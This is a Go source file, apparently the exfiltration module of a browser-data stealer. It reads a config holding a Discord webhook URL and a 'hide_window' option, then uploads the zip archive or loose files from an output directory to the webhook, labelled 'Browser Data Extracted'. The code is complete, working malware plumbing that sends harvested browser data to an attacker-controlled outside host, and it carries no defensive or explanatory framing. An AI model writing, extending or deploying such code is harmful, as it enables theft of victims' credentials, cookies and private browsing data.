package webhook

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

// Config represents the webhook configuration
type Config struct {
	DiscordWebhook string `json:"discord_webhook"`
	HideWindow     bool   `json:"hide_window"`
}

// LoadConfig loads the webhook configuration from the config file
// Supports both .json and .jsonc (JSON with comments)
func LoadConfig(configPath string) (*Config, error) {
	if _, err := os.Stat(configPath); os.IsNotExist(err) {
		return &Config{}, nil
	}

	data, err := os.ReadFile(configPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read config file: %w", err)
	}

	// Remove JSONC comments (// style)
	cleanedData := removeJSONComments(string(data))

	var config Config
	if err := json.Unmarshal([]byte(cleanedData), &config); err != nil {
		return nil, fmt.Errorf("failed to parse config file: %w", err)
	}

	return &config, nil
}

// removeJSONComments removes // style comments from JSON content
func removeJSONComments(content string) string {
	var result []byte
	inString := false
	escaped := false

	lines := []byte(content)
	i := 0
	for i < len(lines) {
		char := lines[i]

		// Track if we're inside a string
		if char == '"' && !escaped {
			inString = !inString
		}

		// Track escape sequences
		if char == '\\' && !escaped {
			escaped = true
		} else {
			escaped = false
		}

		// Check for // comment (only outside strings)
		if !inString && i+1 < len(lines) && char == '/' && lines[i+1] == '/' {
			// Skip until end of line
			for i < len(lines) && lines[i] != '\n' {
				i++
			}
			continue
		}

		result = append(result, char)
		i++
	}

	return string(result)
}

// SendToDiscord sends files from the output directory to Discord webhook
func SendToDiscord(webhookURL, outputDir string) error {
	if webhookURL == "" {
		return fmt.Errorf("webhook URL is empty")
	}

	files, err := os.ReadDir(outputDir)
	if err != nil {
		return fmt.Errorf("failed to read output directory: %w", err)
	}

	if len(files) == 0 {
		return fmt.Errorf("no files to send in directory: %s", outputDir)
	}

	// Find the zip file if it exists, otherwise send all files
	var zipFile string
	for _, file := range files {
		if !file.IsDir() && filepath.Ext(file.Name()) == ".zip" {
			zipFile = filepath.Join(outputDir, file.Name())
			break
		}
	}

	if zipFile != "" {
		// Send the zip file
		return sendFile(webhookURL, zipFile)
	}

	// Send all individual files
	for _, file := range files {
		if !file.IsDir() {
			filePath := filepath.Join(outputDir, file.Name())
			if err := sendFile(webhookURL, filePath); err != nil {
				return fmt.Errorf("failed to send file %s: %w", file.Name(), err)
			}
			// Small delay to avoid rate limiting
			time.Sleep(500 * time.Millisecond)
		}
	}

	return nil
}

// sendFile sends a single file to Discord webhook
func sendFile(webhookURL, filePath string) error {
	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("failed to open file: %w", err)
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Add the file
	part, err := writer.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("failed to create form file: %w", err)
	}

	if _, err := io.Copy(part, file); err != nil {
		return fmt.Errorf("failed to copy file content: %w", err)
	}

	// Add a message with the payload_json field
	fileInfo, _ := os.Stat(filePath)
	payload := map[string]interface{}{
		"content": fmt.Sprintf("**Browser Data Extracted** :file_folder:\n```\nFile: %s\nSize: %d bytes\nTimestamp: %s\n```",
			filepath.Base(filePath),
			fileInfo.Size(),
			time.Now().Format("2006-01-02 15:04:05")),
	}
	payloadBytes, _ := json.Marshal(payload)
	_ = writer.WriteField("payload_json", string(payloadBytes))

	if err := writer.Close(); err != nil {
		return fmt.Errorf("failed to close multipart writer: %w", err)
	}

	// Send HTTP request
	req, err := http.NewRequest("POST", webhookURL, body)
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		bodyBytes, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("discord webhook returned status %d: %s", resp.StatusCode, string(bodyBytes))
	}

	return nil
}
